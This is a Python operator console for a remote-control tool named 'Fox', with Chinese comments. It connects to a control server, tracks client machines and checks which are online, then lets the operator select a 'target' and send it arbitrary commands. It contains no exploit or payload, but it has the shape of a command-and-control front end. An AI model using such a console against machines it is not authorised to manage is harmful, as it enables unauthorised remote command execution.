import socket
import time
import traceback
import json
import re
import threading
from typing import Dict, Any, List, Optional

from fox_display import display_banner, get_help, clear_screen
from fox_parser import parse_ping_output
from fox_network import FoxClient
from colorama import Fore, Style, init

# 初始化colorama
init()


class FoxClientManager:
    def __init__(self):
        self.history_clients = {}  # 历史客户端 {ip: {'last_seen': timestamp, 'info': info}}
        self.online_clients = {}  # 在线客户端 {ip: info}
        self.client = FoxClient()  # 主客户端连接
        self.current_target = None  # 当前选中的目标IP
        self.lock = threading.Lock()  # 新增线程锁

    def update_history(self, ip: str, info: Dict[str, Any]):
        """更新历史记录"""
        with self.lock:
            self.history_clients[ip] = {
                'last_seen': time.time(),
                'info': info
            }

    def check_client_online(self, ip, port=5001, timeout=2):
        """检查客户端在线状态"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                return result == 0
        except Exception as e:
            print(f"{Fore.YELLOW}[!] 检查 {ip} 时出错: {e}{Style.RESET_ALL}")
            return False


    def _check_single_client(self, ip):
        """检查单个客户端"""
        if self.check_client_online(ip):
            with self.lock:  # 使用锁保证线程安全
                if ip in self.history_clients:
                    self.online_clients[ip] = self.history_clients[ip]['info']
                    print(f"{Fore.GREEN}[+] 客户端在线: {ip}{Style.RESET_ALL}")

    def check_online_clients(self):
        """检查在线客户端"""
        if not self.history_clients:
            print(f"{Fore.RED}[!] 没有历史设备记录{Style.RESET_ALL}")
            return False

        print(f"{Fore.MAGENTA}[*] 正在检测在线状态...{Style.RESET_ALL}")
        self.online_clients.clear()

        threads = []
        for ip in list(self.history_clients.keys()):  # 使用list避免线程问题
            t = threading.Thread(target=self._check_single_client, args=(ip,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        return bool(self.online_clients)

    def show_online_clients(self):
        """显示在线客户端"""
        if not self.online_clients:
            print(f"{Fore.RED}[!] 没有检测到在线设备{Style.RESET_ALL}")
            return

        print(f"\n{Fore.GREEN}[在线设备列表]{Style.RESET_ALL}")
        for i, (ip, info) in enumerate(self.online_clients.items(), 1):
            last_seen = time.strftime('%Y-%m-%d %H:%M:%S',
                                      time.localtime(self.history_clients[ip]['last_seen']))
            print(f"{Fore.CYAN}{i}. {ip}:{Style.RESET_ALL}")
            print(f"   {Fore.BLUE}├─ 最后活跃: {last_seen}{Style.RESET_ALL}")
            print(f"   {Fore.BLUE}└─ 设备信息: {info}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}总计: {len(self.online_clients)}个在线设备{Style.RESET_ALL}")

    def show_history_clients(self):
        """显示历史客户端"""
        if not self.history_clients:
            print(f"{Fore.RED}[!] 没有历史设备记录{Style.RESET_ALL}")
            return

        print(f"\n{Fore.MAGENTA}[历史设备记录]{Style.RESET_ALL}")
        for i, (ip, info) in enumerate(self.history_clients.items(), 1):
            last_seen = time.strftime('%Y-%m-%d %H:%M:%S',
                                      time.localtime(info['last_seen']))
            print(f"{Fore.CYAN}{i}. {ip}:{Style.RESET_ALL}")
            print(f"   {Fore.BLUE}├─ 最后活跃: {last_seen}{Style.RESET_ALL}")
            print(f"   {Fore.BLUE}└─ 设备信息: {info['info']}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}总计: {len(self.history_clients)}个历史设备{Style.RESET_ALL}")

    def select_target(self) -> bool:
        """选择目标客户端"""
        if not self.online_clients:
            print(f"{Fore.RED}[!] 没有在线设备可供选择{Style.RESET_ALL}")
            return False

        self.show_online_clients()

        while True:
            try:
                choice = input(
                    f"\n{Fore.YELLOW}请选择目标设备(1-{len(self.online_clients)})或输入0取消: {Style.RESET_ALL}").strip()
                if choice == '0':
                    return False

                index = int(choice) - 1
                if 0 <= index < len(self.online_clients):
                    self.current_target = list(self.online_clients.keys())[index]
                    print(f"{Fore.GREEN}[*] 已选择目标: {self.current_target}{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[!] 请输入有效数字{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] 请输入数字{Style.RESET_ALL}")

    def send_to_target(self, command: str) -> Optional[str]:
        """向选中的目标发送命令"""
        if not self.current_target:
            print(f"{Fore.RED}[!] 未选择目标设备{Style.RESET_ALL}")
            return None

        try:
            # 这里需要根据实际协议实现向特定目标发送命令
            # 示例实现，可能需要根据您的FoxClient类调整
            response = self.client.send_command(f"target {self.current_target} {command}")
            return response.decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"{Fore.RED}[!] 命令发送失败: {e}{Style.RESET_ALL}")
            return None


def parse_client_info(text: str) -> Optional[Dict[str, Any]]:
    """尝试从文本中解析客户端信息"""
    # 增强的解析逻辑
    patterns = [
        r"(ID|IP|Hostname|上线时间)[:=]\s*([^\s,]+)",  # 匹配 ID: xxx 或 ID=xxx
        r"(\d+\.\d+\.\d+\.\d+)",  # 匹配IP地址
        r"hostname\s*[:=]\s*([^\s,]+)",  # 匹配hostname
    ]

    client_info = {}

    # 尝试JSON解析
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            return data
        elif isinstance(data, list):
            return {"data": data}  # 返回列表数据
    except json.JSONDecodeError:
        pass

    # 正则匹配
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                key, value = match
                key = key.lower()
            else:
                key = 'ip'
                value = match

            if key in ['id', 'ip', 'hostname', '上线时间']:
                client_info[key] = value

    return client_info if client_info else None


def main():
    display_banner()
    manager = FoxClientManager()

    # 初始连接处理
    while True:
        try:
            if manager.client.connect():
                print(
                    f"{Fore.GREEN}[*] 已连接到控制服务器 {manager.client.server_host}:{manager.client.server_port}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[*] 输入命令或/help获取帮助{Style.RESET_ALL}")

                # 初始加载历史客户端 (模拟数据，实际应从服务器获取)
                manager.update_history("192.168.1.100", {"id": "client1", "hostname": "PC-01"})
                manager.update_history("192.168.1.101", {"id": "client2", "hostname": "PC-02"})
                break
            else:
                raise ConnectionError("连接服务器失败")
        except Exception as e:
            print(f"\n{Fore.RED}[!] 连接失败: {e}{Style.RESET_ALL}")
            choice = input(f"{Fore.YELLOW}是否尝试重新连接？(Y/N):{Style.RESET_ALL}").strip().lower()
            if choice != 'y':
                return

    # 主命令循环
    while True:
        try:
            prompt = f"{Fore.RED}Fox>{Style.RESET_ALL}"
            if manager.current_target:
                prompt = f"{Fore.RED}Fox@{manager.current_target}>{Style.RESET_ALL}"

            cmd = input(prompt + " ").strip()

            if not cmd:
                continue

            if cmd.lower() == '/help':
                help_text = get_help() + """

目标控制命令:
  /online        - 列出所有在线设备
  /history       - 列出所有历史设备
  /select        - 选择目标设备
  /deselect      - 取消当前选择的目标
  /to <command>  - 向选中的目标发送命令
"""
                print(help_text)
                continue

            if cmd.lower() == '/clear':
                clear_screen()
                display_banner()
                continue

            if cmd.lower() == '/history':
                manager.show_history_clients()
                continue

            if cmd.lower() == '/online':
                if manager.check_online_clients():
                    manager.show_online_clients()
                continue

            if cmd.lower() == '/select':
                if manager.select_target():
                    print(f"{Fore.GREEN}[*] 已选择目标: {manager.current_target}{Style.RESET_ALL}")
                continue

            if cmd.lower() == '/deselect':
                manager.current_target = None
                print(f"{Fore.GREEN}[*] 已取消目标选择{Style.RESET_ALL}")
                continue

            if cmd.lower().startswith('/to '):
                if manager.current_target:
                    command = cmd[4:].strip()
                    response = manager.send_to_target(command)
                    if response:
                        print(response)
                else:
                    print(f"{Fore.RED}[!] 请先使用/select选择目标设备{Style.RESET_ALL}")
                continue

            if cmd.lower() == 'exit':
                try:
                    manager.client.send_command(cmd)
                except:
                    pass
                break

            # 普通命令处理
            try:
                if cmd.startswith('ping'):
                    response = manager.client.send_command(cmd)
                    print(parse_ping_output(response))
                    continue

                response = manager.client.send_command(cmd)
                response_str = response.decode('utf-8', errors='ignore')
                print(response_str)

                # 尝试从响应中提取客户端信息
                client_info = parse_client_info(response_str)
                if client_info and 'ip' in client_info:
                    manager.update_history(client_info['ip'], client_info)

            except (ConnectionError, socket.error) as e:
                print(f"\n{Fore.RED}[!] 连接错误: {e}{Style.RESET_ALL}")
                choice = input(f"{Fore.YELLOW}是否尝试重新连接？(Y/N):{Style.RESET_ALL}").strip().lower()
                if choice != 'y':
                    return
                try:
                    manager.client.close()
                    manager.client = FoxClient(manager.client.server_host, manager.client.server_port)
                    if manager.client.connect():
                        print(f"{Fore.GREEN}[*] 重新连接成功{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[!] 重连失败: {e}{Style.RESET_ALL}")

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] 用户中断连接{Style.RESET_ALL}")
            choice = input(f"{Fore.YELLOW}是否确认退出？(Y/N):{Style.RESET_ALL}").strip().lower()
            if choice == 'y':
                break
            else:
                continue

        except Exception as e:
            print(f"{Fore.RED}[!] 未知错误: {e}{Style.RESET_ALL}")
            traceback.print_exc()
            continue

    manager.client.close()
    print(f"{Fore.RED}[-] 连接已关闭{Style.RESET_ALL}")


if __name__ == "__main__":
    main()